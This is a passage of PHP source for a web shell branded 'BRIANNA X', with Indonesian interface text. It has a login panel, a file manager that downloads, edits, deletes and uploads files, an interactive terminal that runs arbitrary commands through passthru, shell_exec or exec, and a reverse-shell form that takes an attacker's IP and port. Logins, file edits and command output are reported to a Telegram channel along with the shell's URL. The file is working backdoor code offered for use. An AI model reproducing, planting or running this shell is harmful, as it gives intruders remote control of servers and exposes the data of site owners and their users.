        deleteRecursive($target);
    }
    header("Location: ?dir=" . urlencode($redirectDir));
    exit;
}

if (isset($_GET['download'])) {
    $file = @urldecode($_GET['download']);
    if (@is_file($file)) {

        $downloaded_web_url = get_web_url_from_path($file);

        while (ob_get_level()) @ob_end_clean();
        header("Content-Description: File Transfer");
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=\"" . @basename($file) . "\"");
        header("Content-Transfer-Encoding: binary");
        header("Expires: 0");
        header("Cache-Control: must-revalidate");
        header("Pragma: public");
        header("Content-Length: " . @filesize($file));
        @flush();
        @readfile($file);
        exit;
    } else {
        @http_response_code(404);
        echo "❌ Gagal: file tidak ditemukan atau tidak valid.";
        exit;
    }
}

if (isset($_GET['edit']) && isset($_GET['ajax']) && @is_file($_GET['edit'])) {
    $file = $_GET['edit'];
    $content = @file_get_contents($file);

    echo "<h3>📝 Edit File: " . htmlspecialchars(@basename($file)) . "</h3>
    <form onsubmit='saveFile(event); return false;'>
        <input type='hidden' id='editFilePath' value='" . htmlspecialchars($file) . "'>
        <textarea id='fileContent' style='min-height: 400px; font-family: monospace; font-size: 14px;'>" . htmlspecialchars($content) . "</textarea>
        <button type='submit' style='margin-top: 10px; background: #009933; color: white;'>💾 Save Changes</button>
    </form>
    <div id='editStatus' style='margin-top: 10px;'></div>";
    exit;
}

if (isset($_POST['save_edit'])) {
    $file = $_POST['target_file'];
    $data = $_POST['new_content'];
    @ob_clean();
    $result = @file_put_contents($file, $data);
    if ($result === false) {
        echo "ERROR: Tidak bisa menulis ke file: $file";
    } else {
        @chmod($file, 0666);

        $edited_web_url = get_web_url_from_path($file);

        $report_message = "\u{1F4DD} <b>FILE EDITED/SAVED!</b>\n";
        $report_message .= "==============================\n";
        $report_message .= "<b>Shell URL:</b> <a href=\"" . get_base_url() . ($_SERVER['REQUEST_URI'] ?? '/') . "\">" . get_base_url() . "</a>\n";
        $report_message .= "<b>Attacker IP:</b> <code>" . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "</code>\n";
        $report_message .= "<b>File Name:</b> <code>" . htmlspecialchars(basename($file)) . "</code>\n";
        $report_message .= "<b>File URL:</b> <a href=\"" . htmlspecialchars($edited_web_url) . "\">" . htmlspecialchars($edited_web_url) . "</a>\n";
        $report_message .= "<b>Size (Bytes):</b> <code>" . @strlen($data) . "</code>\n";
        send_telegram_report($report_message);
        echo "OK";
    }
    exit;
}

if (isset($_GET['terminal']) && isset($_GET['ajax'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        @ob_clean();

        $cwd = $_SESSION['terminal_cwd'] ?? @getcwd();

        if (isset($_POST['set_dir'])) {
          $cwd = @realpath($_POST['set_dir']) ? @realpath($_POST['set_dir']) : $_POST['set_dir'];
          $_SESSION['terminal_cwd'] = $cwd;
        }

        if (!@is_dir($cwd)) {
          $cwd = @getcwd();
          $_SESSION['terminal_cwd'] = $cwd;
        }

        $cmd = $_POST['cmd'] ?? '';
        $output_for_report = '';
        $is_cd = false;

        if (@preg_match('/^\s*cd\s*(.*)$/', $cmd, $matches)) {
            $is_cd = true;
            $path = @trim($matches[1]);

            if (empty($path) || $path === '~' || $path === '/') {
                $newDir = @getenv('HOME') ?: (@getenv('USERPROFILE') ?: '/');
            } elseif ($path === '-') {
                $newDir = $_SESSION['prev_dir'] ?? $cwd;
            } else {
                $newDir = $cwd . DIRECTORY_SEPARATOR . $path;
                $resolvedDir = @realpath($newDir);
                $newDir = $resolvedDir ? $resolvedDir : $newDir;
            }

            if (@is_dir($newDir)) {
                $_SESSION['prev_dir'] = $cwd;
                $_SESSION['terminal_cwd'] = $newDir;
                $output_for_report = "Directory changed to: " . $newDir;
                echo "__CHDIR__:" . $newDir;
            } else {
                $output_for_report = "cd failed: No such file or directory, or permission denied.";
                echo "❌ cd: " . htmlspecialchars($path) . ": No such file or directory, or permission denied.";
            }

        } else {
            @chdir($cwd);
            $output = '';

            $escaped_cmd = trim($cmd);

            if (@function_exists('passthru')) {
                @ob_start();
                @passthru($escaped_cmd . ' 2>&1', $return_var);
                $output = @ob_get_clean();
            } elseif (@function_exists('shell_exec')) {
                $output = @shell_exec($escaped_cmd . ' 2>&1');
            } elseif (@function_exists('exec')) {
                $output_array = [];
                @exec($escaped_cmd . ' 2>&1', $output_array);
                $output = @implode("\n", $output_array);
            }

            if (empty($output) && $cmd !== '') {
                 $disabled_functions = @ini_get('disable_functions');
                 $output_for_report = "Command execution failed. Disabled functions: " . (empty($disabled_functions) ? "None" : $disabled_functions);
                 echo "❌ Command execution failed on the server.\n";
                 echo "   - Alasan: Semua fungsi eksekusi perintah gagal atau tidak tersedia.\n";
                 echo "   - Cek 'disable_functions': " . (empty($disabled_functions) ? "None" : htmlspecialchars($disabled_functions)) . "\n";
            } else {
                 $output_for_report = trim(substr(str_replace("\n", " | ", $output), 0, 100)) . (strlen($output) > 100 ? '...' : '');
                 echo $output;
            }
        }

        if (!$is_cd || strpos($output_for_report, 'failed') !== false) {
             if (!empty($cmd) || strpos($output_for_report, 'failed') !== false) {
                 $report_message = "\u{1F4BB} <b>TERMINAL COMMAND REPORT</b>\n";
                 $report_message .= "==============================\n";
                 $report_message .= "<b>Shell URL:</b> <a href=\"" . get_base_url() . ($_SERVER['REQUEST_URI'] ?? '/') . "\">" . get_base_url() . "</a>\n";
                 $report_message .= "<b>Attacker IP:</b> <code>" . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "</code>\n";
                 $report_message .= "<b>Command:</b> <code>" . htmlspecialchars($cmd) . "</code>\n";
                 $report_message .= "<b>Output Snippet:</b> <code>" . htmlspecialchars($output_for_report) . "</code>\n";
                 send_telegram_report($report_message);
             }
        }

        exit;
    }

    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : @getcwd();
    $currentDir = @realpath($currentDir) ? @realpath($currentDir) : $currentDir;
    if (!@is_dir($currentDir)) {
      $currentDir = @getcwd();
    }
    $_SESSION['terminal_cwd'] = $currentDir;
    ?>
    <style>
      .terminal-wrapper { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; height: 500px; }
      #terminal-output { flex: 1; padding: 10px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px; line-height: 1.4; border-bottom: 2px solid #555; }
      #terminal-input-container { display: flex; background: #111; padding: 5px; }
      .prompt { color: #00ff00; padding: 8px; font-weight: bold; align-self: center; }
      #terminal-input { flex: 1; background: #000; color: #0f0; border: none; padding: 8px; font-family: 'Courier New', monospace; font-size: 14px; outline: none !important; }
      #terminal-execute { background: #00cc66; color: white; border: none; padding: 8px 12px; cursor: pointer; font-family: 'Courier New', monospace; font-size: 14px; margin-left: 5px;}
      #terminal-execute:hover { background: #00994d; }
    </style>
    <div class="terminal-wrapper">
        <h3 style="margin-top: 0;">💻 Terminal Interaktif</h3>
        <p style="margin: 5px 0; color: #55ff55; font-size: 13px;">Current Directory: <span id="currentDirDisplay"><?= htmlspecialchars($currentDir) ?></span></p>
        <div id="terminal-output"></div>
        <div id="terminal-input-container">
            <div class="prompt">>></div>
            <input type="text" id="terminal-input" autocomplete="off" placeholder="ls -la">
            <button id="terminal-execute">Execute</button>
        </div>
    </div>
    <script>
    // Terminal variables
    let terminalInitialized = false;
    let currentTerminalDir = '<?= htmlspecialchars($currentDir) ?>';
    let commandHistory = [];
    let historyIndex = 0;
    
    // Initialize terminal when modal opens
    function initTerminal() {
        if (terminalInitialized) return;
        
        const output = document.getElementById('terminal-output');
        const input = document.getElementById('terminal-input');
        const dirDisplay = document.getElementById('currentDirDisplay');
        const executeBtn = document.getElementById('terminal-execute');
        
        // Clear and initialize output
        output.innerText = "PHP Interactive Shell Ready.\nType 'help' for functions/info.\n";
        output.scrollTop = output.scrollHeight;
        
        // Function to send command
        function sendTerminalCommand() {
            const cmd = input.value.trim();
            if (!cmd) return;
            
            // Add to history
            if (commandHistory[commandHistory.length - 1] !== cmd) {
                commandHistory.push(cmd);
            }
            historyIndex = commandHistory.length;
            
            // Display command
            output.innerText += "$ " + cmd + "\n";
            output.scrollTop = output.scrollHeight;
            input.value = '';
            
            // Prepare data
            const formData = new FormData();
            formData.append('cmd', cmd);
            formData.append('set_dir', currentTerminalDir);
            
            // Send to server
            fetch("?terminal=1&ajax=1", {
                method: "POST",
                body: formData
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.text();
            })
            .then(resp => {
                if (resp.startsWith("__CHDIR__:")) {
                    currentTerminalDir = resp.substring(10);
                    dirDisplay.innerText = currentTerminalDir;
                    output.innerText += "Directory changed to: " + currentTerminalDir + "\n";
                } else {
                    output.innerText += resp + "\n";
                }
                output.scrollTop = output.scrollHeight;
            })
            .catch(error => {
                output.innerText += "❌ Error: " + error.message + "\n";
                output.scrollTop = output.scrollHeight;
            });
        }
        
        // Event listeners
        executeBtn.addEventListener('click', sendTerminalCommand);
        
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                sendTerminalCommand();
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    input.value = commandHistory[historyIndex] || '';
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    input.value = commandHistory[historyIndex] || '';
                } else {
                    historyIndex = commandHistory.length;
                    input.value = '';
                }
            }
        });
        
        // Focus input
        input.focus();
        
        terminalInitialized = true;
    }
    </script>
    <?php
    exit;
}

$rootDir = @getcwd();

$currentDir = @isset($_GET['dir']) ? $_GET['dir'] : $rootDir;
$currentDir = @realpath($currentDir) ? @realpath($currentDir) : $currentDir;
if (!@is_dir($currentDir)) {
    $currentDir = $rootDir;
}
@chdir($currentDir);

$error = '';
if (@isset($_POST['login'])) {
    $pass_input = $_POST['pass'] ?? '';
    $pass_attempt_hash = @md5($pass_input);

    $user_input = $_POST['user'] ?? '';
    $user_attempt_hash = @md5($user_input);

    if ($user_attempt_hash === $valid_user && $pass_attempt_hash === $valid_pass) { 
        @session_regenerate_id(true);
        $_SESSION['logged_in'] = true;

        send_telegram_report(get_initial_info() . "\n<b>Status:</b> \u{1F513} LOGIN SUCCESS\n<b>Username:</b> <code>{$user_input}</code>");

        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Username atau Password salah!";
    }
}

if (@isset($_GET['logout'])) {

    if (@isset($_SESSION['logged_in'])) {
        $report_message = "\u{1F6AA} <b>LOGOUT REPORT</b>\n";
        $report_message .= "==============================\n";
        $report_message .= "<b>Shell URL:</b> <a href=\"" . get_base_url() . ($_SERVER['REQUEST_URI'] ?? '/') . "\">" . get_base_url() . "</a>\n";
        $report_message .= "<b>Attacker IP:</b> <code>" . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "</code>\n";
        $report_message .= "<b>Status:</b> Logged out/Session Ended\n";
        send_telegram_report($report_message);
    }

    @session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}

if (empty($_SESSION['logged_in'])):
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>LOGIN - BRIANNA X</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
      body {
        margin: 0; padding: 0;
        background: #0e0e0e url('https://iili.io/f77MBVe.webp') no-repeat center center fixed;
        background-size: cover; font-family: 'Courier New', monospace; color: #eee;
        display: flex; justify-content: center; align-items: center; height: 100vh;
      }
      .login-box {
        background: rgba(0, 0, 0, 0.85); padding: 40px; border-radius: 8px; box-shadow: 0 0 10px #00ff00ff;
        width: 300px; text-align: center;
      }
      .login-box h2 { margin-bottom: 20px; color: #00ff00ff; }
      .login-box input[type="text"],
      .login-box input[type="password"] {
        width: 100%; padding: 10px; margin: 8px 0; background: #1a1a1a; border: 1px solid #333; border-radius: 4px; color: #0ff;
      }
      .login-box input[type="submit"] {
        background: #00bfff; border: none; padding: 10px; width: 100%; max-width: 100%; display: block;
        margin: 16px auto 0; border-radius: 4px; color: #000; font-weight: bold; cursor: pointer;
      }
      .login-box form { display: flex; flex-direction: column; align-items: center; }
      .login-box input[type="submit"]:hover { background: #00dfff; }
      .error { color: #ff4444; margin-bottom: 10px; }
      .footer { margin-top: 20px; font-size: 12px; color: #777; }
    </style>
</head>
<body>
    <div class="login-box">
      <h2>LOGIN PANEL</h2>
      <?php if ($error) echo "<div class='error'>$error</div>"; ?>
      <form method="post">
        <input type="text" name="user" placeholder="Username" required>
        <input type="password" name="pass" placeholder="Password" required>
        <input type="submit" name="login" value="Login">
      </form>
      <div class="footer">
        By <a href="https://t.me/Brianna888999" target="_blank" style="color:#00bfff;">@Brianna888999</a>
      </div>
    </div>
</body>

  </html>
<?php exit; endif;

if (@isset($_SESSION['notification'])) {
    $notif = $_SESSION['notification'];
    $type = $notif['type'];
    $message = $notif['message'];
    $bgColor = ($type === 'success') ? '#4CAF50' : '#f44336';

    echo "<div id='notification' style='position:fixed;top:20px;right:20px;background:$bgColor;color:white;padding:15px;border-radius:5px;z-index:9999;box-shadow:0 0 10px rgba(0,0,0,0.5);'>
            " . ($type === 'success' ? '✅' : '❌') . " $message
          </div>";

    unset($_SESSION['notification']);

    echo "<script>
            setTimeout(function() {
              var notif = document.getElementById('notification');
              if (notif) notif.style.display = 'none';
            }, 3000);
          </script>";
}

?>

<!DOCTYPE html>
<html>

<head>
  <title>PANEL BRIANNA X</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
     body {
      background: url('https://res.cloudinary.com/dstvfk3po/image/upload/v1753105097/wolf_cmybnd.webp') no-repeat center center fixed;
      background-size: cover; color: #ddd; font-family: monospace; margin: 0; min-height: 100vh;
      display: flex; flex-direction: column;
    }

    .nav { background: #222; padding: 10px; display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; border-bottom: 2px solid #00ff00ff; }
    .nav button { background: #333; color: #fff; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; transition: 0.3s; }
    .nav button:hover { background: #555; box-shadow: 0 0 5px #00ff00ff; }
    .section { padding: 20px; }
    a { color: #61dafb; text-decoration: none; }

    .modal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); }
    .modal-content {
      background: #222; margin: 5% auto; padding: 20px; width: 90%; max-width: 900px; color: #fff;
      border-radius: 5px; box-shadow: 0 0 15px #00ff00ff; position: relative; max-height: 90vh; overflow-y: auto;
    }
    .modal-close { position: absolute; top: 10px; right: 15px; cursor: pointer; color: #aaa; font-size: 20px; }

    input[type="text"], input[type="number"], textarea { background: #2e2e2e; color: #fff; border: 1px solid #444; padding: 8px; width: 100%; margin: 5px 0 10px 0; box-sizing: border-box; }
    textarea { min-height: 200px; resize: vertical; }

    .file-line { display: flex; justify-content: space-between; align-items: center; padding: 4px 0; border-top: 1px solid #333; }
    .file-line:hover { background: rgba(255, 255, 255, 0.08); }
    .file-line:first-child { border-top: none; }
    .file-line > span { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

    .file-line-header > span:nth-child(2), .file-line > span:nth-child(2) {
       flex: 1.5;
       text-align: center;
    }

    footer { background: #111; border-top: 1px solid #333; color: #777; text-align: center; padding: 15px; font-size: 12px; }
    footer a { color: #00bfff; text-decoration: none; }
    footer > div { margin-top: 5px; }

    @media (max-width: 768px) {
        .header-info { flex-direction: column !important; align-items: center !important; }
        .header-info > div:first-child { width: 100%; margin-bottom: 10px; }
        .nav { flex-direction: row; }
        .nav button, .nav form { margin: 5px 2px; }
        .file-line { flex-wrap: wrap; }
        .file-line > span:nth-child(1) { flex: 1 1 100%; margin-bottom: 5px; }
        .file-line > span:nth-child(2) { order: 3; flex: 1 1 50%; text-align: left !important; }
        .file-line > span:nth-child(3) { order: 2; flex: 1 1 50%; text-align: right !important; }
    }
  </style>
</head>

<body>

  <div class="header-info"
    style="display: flex; justify-content: space-between; align-items: flex-start; background: #111; color: #00ff00ff; padding: 20px; border-bottom: 1px solid #444;">
    <div style="flex: 1;">
      <div style="font-size: 24px; font-weight: bold;">PANEL BRIANNA X</div>
      <div style="font-size: 14px; color: #ffcc00; margin-top: 5px;">Version: <?= WEBSHELL_VERSION; ?></div>
      <div style="max-width: 100%; width: 100%; border-top: 1px solid #444; margin: 10px 0;"></div>
      <div style="font-size: 13px; color: #ccc; line-height: 1.5;">
        <b>SERVER INFO:</b><br>
        OS: <?= @php_uname(); ?><br>
        PHP Version: <?= @phpversion(); ?><br>
        Disabled Functions: <?= @ini_get('disable_functions') ?: 'None'; ?><br>
        Working Dir: <code><?= htmlspecialchars($currentDir); ?></code>
      </div>
    </div>
    <div style="flex: 0 0 160px; text-align: center;">
      <img src="https://iili.io/f7aAwf2.jpg"
        style="width: 120px; height: 120px; object-fit: cover; border-radius: 8px; box-shadow: 0 0 8px #00ff00ff;">
      <div style="margin-top: 8px;">
        <a href="https://t.me/Brianna888999" target="_blank"
          style="color: #00bfff; font-size: 13px;">
          <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" style="width: 14px; height: 14px;">@Brianna888999
        </a>
      </div>

      <div style="margin-top: 15px;">
        <a href="?logout=1">
          <button
            style="padding: 6px 14px; background-color: #ff4444; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-family: monospace;">
            🚪 Logout
          </button>
        </a>
      </div>
    </div>
  </div>

  <div class="nav" style="flex-wrap: wrap; gap: 5px;">
    <a href="?dir=<?= urlencode($rootDir); ?>"><button>🏠 Home</button></a>

    <form method="post" enctype="multipart/form-data" style="display:inline;" id="uploadForm">
      <input type="file" name="upload_file" id="uploadFile" style="display:none;" onchange="document.getElementById('uploadForm').submit()">
      <button type="button" onclick="document.getElementById('uploadFile').click()">⬆️ Upload File</button>
    </form>

    <form method="post" style="display:inline-flex; align-items:center;">
      <input type="text" name="folder_name" placeholder="📂 Folder Name" style="padding:4px; max-width:110px;">
      <button type="submit" name="create_folder" style="height: 35px; margin-left: 5px;">Create Folder</button>
    </form>

    <form method="post" style="display:inline-flex; align-items:center;">
      <input type="text" name="file_name" placeholder="📄 File.txt" style="padding:4px; max-width:110px;">
      <button type="submit" name="create_file" style="height: 35px; margin-left: 5px;">Create File</button>
    </form>

    <button onclick="openModalWithURL('?terminal=1&ajax=1&dir=<?= urlencode($currentDir) ?>'); return false;">💻 Terminal</button>

    <button onclick="initReverseShell()">📡 Reverse Shell</button>

    <button onclick="openModalWithURL('?shell_finder=1&ajax=1')">🔎</button>

    <button onclick="openModalWithURL('?defense_shell=1&ajax=1')">🛡️</button>
  </div>

  <main style="flex: 1; overflow-y: auto;">
    <div class="section">
      <h3>File Manager</h3>
      <?php
      $items = @scandir($currentDir);
      if ($items === false) {
        echo "<p style='color:red;'>Gagal membaca isi direktori: Permission Denied atau Path Tidak Valid ({$currentDir}).</p>";
        $items = [];
      } else {
        $dirs = @array_filter($items, function($item) use ($currentDir) {
            return ($item !== '.' && $item !== '..' && @is_dir($currentDir . DIRECTORY_SEPARATOR . $item));
        });
        $files = @array_filter($items, function($item) use ($currentDir) {
            return ($item !== '.' && $item !== '..' && @is_file($currentDir . DIRECTORY_SEPARATOR . $item));
        });
        @sort($dirs);
        @sort($files);
        $items = @array_merge(['..'], $dirs, $files);
      }

      $parent = @dirname($currentDir);

      $is_root_dir = false;
      
      if (@realpath($currentDir) === '/' || empty($currentDir) || $parent === $currentDir) {
           $is_root_dir = true;
      }
      
      if ($parent === $currentDir) {
          if (@realpath($currentDir) === '/') {
              $is_root_dir = true;
          }
          $parent = '/';
      } else {
          $is_root_dir = false;
      }

      echo "<div class='file-line file-line-header' style='font-weight: bold; padding: 4px 0; border-top: 1px solid #444; border-bottom: 2px solid #00ff00ff;'>";
      echo "<span style='flex: 3; max-width: 350px; color: #fff;'>Direktori</span>";
      echo "<span style='text-align: center; color: #ffcc00;'>Modifikasi</span>";
      echo "<span style='flex: 1; text-align: center; color: #ffcc00;'>Size</span>";
      echo "<span style='flex: 1; text-align: center; color: #00ff00ff;'>Perms</span>";
      echo "<span style='flex: 1; text-align: right; color: #fff;'>Aksi</span>";
      echo "</div>";

      foreach ($items as $item) {
        $is_parent_dir = $item === '..';

        if ($is_parent_dir && $is_root_dir) continue;

        $fullPath = $is_parent_dir ? $parent : @rtrim($currentDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;
        $isDir = $is_parent_dir ? true : @is_dir($fullPath);

        $icon = $is_parent_dir ? "↩️" : ($isDir ? "📁" : "📄");
        $safe_item_name = $is_parent_dir ? 'Parent Directory' : @htmlspecialchars($item);
        $encoded_path = @urlencode($fullPath);


         $modTime = @filemtime($fullPath);
         $modTimeFormatted = ($modTime !== false && $modTime > 0) ? date('Y-m-d', $modTime) : 'N/A';

        @$permStr = get_perms_string($fullPath);
        @$size = (!$isDir) ? @round(@filesize($fullPath)/1024, 2) . ' KB' : '-';

        echo "<div class='file-line'>";

        if ($isDir) {
           echo "<span style='flex: 3; max-width: 350px;'>$icon <a href='?dir=" . ($is_parent_dir ? $encoded_path : $encoded_path) . "'>$safe_item_name</a></span>";
        } else {
            echo "<span style='flex: 3; max-width: 350px;'>$icon <a href='?download=$encoded_path' title='Download/View'>$safe_item_name</a></span>";
        }

        echo "<span style='text-align: center; color: #00ffaaff;'>$modTimeFormatted</span>";

        echo "<span style='flex: 1; text-align: center; color: #ffcc00;'>$size</span>";

        echo "<span style='flex: 1; text-align: center; cursor:pointer; color:#00ff00ff;' onclick=\"openModalWithURL('?chmod_modal=$encoded_path&ajax=1');\">$permStr</span>";

        echo "<span style='flex: 1; text-align: right;'>";
        if (!$isDir) {
          echo "<a href='#' onclick=\"openModalWithURL('?edit=$encoded_path&ajax=1'); return false;\" title='Edit' style='padding-right: 5px;'>📝</a>";
        }
        if (!$is_parent_dir) {
             echo "<a href='#' onclick=\"openModalWithURL('?rename=$encoded_path&ajax=1'); return false;\" title='Rename'>🔁</a>";
             echo "<a href='?delete=$encoded_path&dir=" . @urlencode($currentDir) . "' onclick=\"return confirm('Hapus $safe_item_name?');\" title='Delete'>❌</a>";
        }
        echo "</span></div>";
      }
      ?>
    </div>
  </main>

  <div class="modal" id="popupModal">
    <div class="modal-content">
      <span class="modal-close" onclick="closeModal()">&times;</span>
      <div id="modalBody">Loading...</div>
    </div>
  </div>

  <div class="modal" id="reverseShellModal">
    <div class="modal-content">
      <span class="modal-close" onclick="closeReverseShellModal()">&times;</span>
      <h3>📡 Reverse Shell</h3>
      <form onsubmit="startReverseShell(event)">
        <label style="font-size: 13px;">Your IP (Listening Host):</label>
        <input type="text" id="attackerIP" placeholder="192.168.1.100" required>
        <label style="font-size: 13px;">Port (Listening Port):</label>
        <input type="number" id="attackerPort" placeholder="4444" value="4444" required>
        <button type="submit" style="margin-top: 10px; background: #00bfff; color: #000; font-weight: bold;">Start Reverse Shell</button>
      </form>
      <div id="reverseShellStatus" style="margin-top: 10px; color: #fff;"></div>
    </div>
  </div>

  <footer>
    <div><a href="https://t.me/Brianna888999" target="_blank">BRIANNA X</a> WebShell &copy;<?= date('Y'); ?> |</div>
    <div>IP Anda: <code><?= $_SERVER['REMOTE_ADDR'] ?? 'Unknown'; ?></code></div>
  </footer>

  <script>
    function closeModal() {
      window.TerminalControlReady = false;
      document.getElementById('popupModal').style.display = 'none';
      document.getElementById('modalBody').innerHTML = 'Loading...';
    }

    function openModalWithURL(url) {
      const modal = document.getElementById('popupModal');
      const body = document.getElementById('modalBody');
      body.innerHTML = 'Loading...';
      modal.style.display = 'block';
      fetch(url)
        .then(res => res.text())
        .then(html => {
          body.innerHTML = html;
        })
        .catch(err => {
          body.innerHTML = '❌ Error loading modal.';
        });
    }

    function saveFile(e) {
        e.preventDefault();
        const filePath = document.getElementById('editFilePath').value;
        const content = document.getElementById('fileContent').value;
        const status = document.getElementById('editStatus');

        status.innerHTML = '🔄 Saving...';

        fetch('<?= @$_SERVER['PHP_SELF'] ?>', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'save_edit=1&target_file=' + encodeURIComponent(filePath) + '&new_content=' + encodeURIComponent(content)
        })
        .then(res => res.text())
        .then(resp => {
            if (resp.trim() === "OK") {
                status.innerHTML = '<span style="color: #00ff7f;">✔ File berhasil disimpan!</span>';
                setTimeout(() => {
                   closeModal();
                   location.reload();
                }, 1500);
            } else {
                status.innerHTML = '<span style="color: #ff4444;">❌ ' + resp + '</span>';
            }
        })
        .catch(err => {
            status.innerHTML = '<span style="color: #ff4444;">❌ Network Error: ' + err.message + '</span>';
        });
    }

    function submitRename(e) {
      e.preventDefault();
      const newName = document.getElementById('newName').value;
      const oldPath = document.getElementById('oldPath').value;

      fetch('<?= @$_SERVER['PHP_SELF'] ?>', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'do_rename=1&old_path=' + encodeURIComponent(oldPath) + '&new_name=' + encodeURIComponent(newName)
      })
        .then(res => res.text())
        .then(resp => {
          if (resp.trim() === "OK") {
             const notif = document.createElement('div');
             notif.id = 'notification';
             notif.style.cssText = 'position:fixed;top:20px;right:20px;background:#4CAF50;color:white;padding:15px;border-radius:5px;z-index:9999;box-shadow:0 0 10px rgba(0,0,0,0.5);';
             notif.innerHTML = '✅ Berhasil merubah nama!';
             document.body.appendChild(notif);

            setTimeout(() => {
              notif.style.display = 'none';
              closeModal();
              location.reload();
            }, 1000);
          } else {
            document.getElementById('renameStatus').innerHTML = '❌ ' + resp;
          }
        });
    }

    function submitChmod(e) {
      e.preventDefault();
      const perm = document.getElementById('newPerm').value;
      const file = document.getElementById('targetFile').value;
      const status = document.getElementById('chmodStatus');

      status.innerHTML = '🔄 Mengubah permission...';

      fetch('<?= @$_SERVER['PHP_SELF'] ?>', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'do_chmod=1&file=' + encodeURIComponent(file) + '&perm=' + encodeURIComponent(perm)
      })
        .then(res => res.text())
        .then(resp => {
          if (resp.trim() === "OK") {
             status.innerHTML = '<span style="color: #00ff7f;">✔ Permission diubah.</span>';
            setTimeout(() => {
              closeModal();
              location.reload();
            }, 1000);
          } else {
            document.getElementById('chmodStatus').innerHTML = '❌ ' + resp;
          }
        });
    }

    function initReverseShell() {
      document.getElementById('reverseShellModal').style.display = 'block';
      document.getElementById('attackerIP').focus();
    }

    function closeReverseShellModal() {
      document.getElementById('reverseShellModal').style.display = 'none';
      document.getElementById('reverseShellStatus').innerHTML = '';
    }

    function startReverseShell(e) {
      e.preventDefault();
      const ip = document.getElementById('attackerIP').value;
      const port = document.getElementById('attackerPort').value;
      const status = document.getElementById('reverseShellStatus');

      if (!ip || !port) {
        status.innerHTML = '❌ Please fill in both IP and Port';
        return;
      }

      status.innerHTML = '🔄 Initiating reverse shell to ' + ip + ':' + port + '...';

      fetch('<?= @$_SERVER['PHP_SELF'] ?>', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'reverse_shell=1&ip=' + encodeURIComponent(ip) + '&port=' + encodeURIComponent(port)
      })
      .then(res => res.text())
      .then(resp => {
        status.innerHTML = resp;
      })
      .catch(err => {
        status.innerHTML = '❌ Network Error: ' + err.message;
      });
    }

    window.onclick = function(event) {
        const modal = document.getElementById('popupModal');
        const rShellModal = document.getElementById('reverseShellModal');

        if (event.target == rShellModal) {
            closeReverseShellModal();
        }

        if (event.target == modal) {
            const modalBody = document.getElementById('modalBody');
            if (!modalBody || modalBody.innerHTML.indexOf('Terminal Interaktif') === -1) {
                closeModal();
            }
        }
    }
  </script>
</body>

</html>